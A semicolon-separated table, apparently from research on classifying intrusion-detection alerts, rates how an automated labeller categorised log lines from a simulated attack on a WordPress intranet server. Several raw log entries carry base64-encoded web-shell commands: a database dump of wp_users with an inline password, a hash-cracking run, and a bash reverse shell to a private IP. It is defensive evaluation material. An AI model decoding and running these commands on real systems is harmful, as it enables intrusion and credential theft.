AT;#;Classification;Attack Line Content;Description;Correct Attack Type?
Dirb;1;"Information Gathering, 
Discovery";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-includes/sitemaps/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";"Classification probably based on special characters and 404 http code; scanning not represented";Too generic
Dirb;2;"Path Traversal, 
Information Gathering";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-includes/js/thickbox/~www HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and 404 http code, no scanning represented;Alternate explanation for alert
Dirb;1;"Information Gathering,  
Directory Listing";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01276: Cannot serve directory /var/www/intranet.price.fox.org/wp-includes/js/thickbox/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive”";Classification probably based on attempted access to directory without directory index;Correct & expressive
Dirb;1;"Information Gathering,
File Enumeration";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-includes/js/thickbox/.hta”";Classification probably based on access to sensitive .hta config file ;Correct & expressive
Dirb;4;"Information Gathering,
Content Discovery";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on 301 http code (redirect) and tool name apache;Too generic
Dirb;2;"Information Gathering,
Vulnerability Scanning";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/js/tinymce/phpinfo.php' not found or unable to stat”";Classification probably based on access attempt to common server configuration file;Correct & expressive
Dirb;3;"Reconnaissance,  
Information Gathering";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/info.php' not found or unable to stat”";Classification probably based on access attempt to common server configuration file;Too generic
Dirb;1;"Reconnaissance, 
Directory Traversal Attempt";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on 403 http code (redirect) and tool name apache;Correct & expressive
Dirb;5;"Reconnaissance, 
Information Gathering,
File Enumeration";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and 404 http code;Correct & expressive
Dirb;3;"Information Gathering, 
Web Content Discovery";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and 404 http code;Too generic
Dirb;1;"Information Gathering,
Exploit Attempt,
Vulnerability Scanning";"IDS: “New event type”, “New path(es) detected”
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”";Classification probably based on attempted access to common php config file;Correct & expressive
Dirb;1;"Information Gathering,
Web Content Discovery,
Attempted Access to Sensitive Files";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/social/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to sensitive files and directory;Correct & expressive
Dirb;2;"Information Gathering, 
Credential Access,
Attempted Access to Sensitive Files";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/js/admin/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to sensitive files and directory;Alternate explanation for alert
Dirb;2;"Information Gathering,
Web Content Discovery,
Directory Traversal";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/js/admin/~adm HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and 404 http code;Correct & expressive
Dirb;1;"Information Gathering, 
Attempted Access to Sensitive Files,
Web Server Misconfiguration Exploitation";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess”";Classification probably based on attempted access to sensitive files and directory;Alternate explanation for alert
Dirb;3;"Information Gathering, 
Web Attack: Directory Traversal / Path Traversal";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess_”";Classification probably based on attempted access to sensitive files and directory;Correct & expressive
Dirb;2;"Information Gathering,
Web Attack: File Enumeration";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/admin.php' not found or unable to stat”";Classification probably based on attempted access to common php config file;Correct & expressive
Web Shell;2;"Web Shell,
Remote Code Execution,
SQL Injection,
Download Cradle";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 200 507795 - python-requests/2.27.1”";Classification probably based on high entropy in payload and keywords like wp_meta, mysql, wget in decoded base64 payload;Correct & expressive
Password Cracking;1;"Web Shell, 
Remote Code Execution,
Credential Access";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 200 506876 - python-requests/2.27.1”";Classification probably based on high entropy in payload and keywords like wphashcrack, rockyou in decoded base64 payload;Alternate explanation for alert
Password Cracking;1;"Web Attack: Brute Force,
Credential Access";"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”,
Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox”";Classification probably based on frequency of apache access request;Correct & expressive
Password Cracking;1;"Resource Hijacking,
Denial of Service,
System Compromise";IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”;Classification probably based on abnormal CPU value;Alternate explanation for alert
Password Cracking;1;"Reconnaissance, 
Command and Control";"IDS: “Unusual occurrence frequencies of DNS query Ips.”, “Frequency anomaly detected”,
Raw Data: “dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from [IP]”";Classification probably based on tool name dnsmasq, unusual frequency of DNS query Ips;Alternate explanation for alert
Reverse Shell;1;"Web Shell, 
Command and Control,
Exploitation for Client Execution";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1 200 506717 - python-requests/2.27.1” ";Classification probably based on high entropy in base64 encoded payload;Correct & expressive
Privilege Escalation;1;"Privilege Escalation,
Account Manipulation";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “intranet-server su[28816]: Successful su for phopkins by www-data”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;Privilege Escalation, Lateral Movement;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkins”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation ;1;Privilege Escalation;"IDS: “New event type.”, “New path(es) detected”;
Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation ;2;Privilege Escalation,;"IDS: “New user_auth parameter combination in Audit logs.”, “New value combination(s) detected,
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;Privilege Escalation,;"IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;Privilege Escalation,;"IDS: “New user_start parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: “type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
;94;;;;
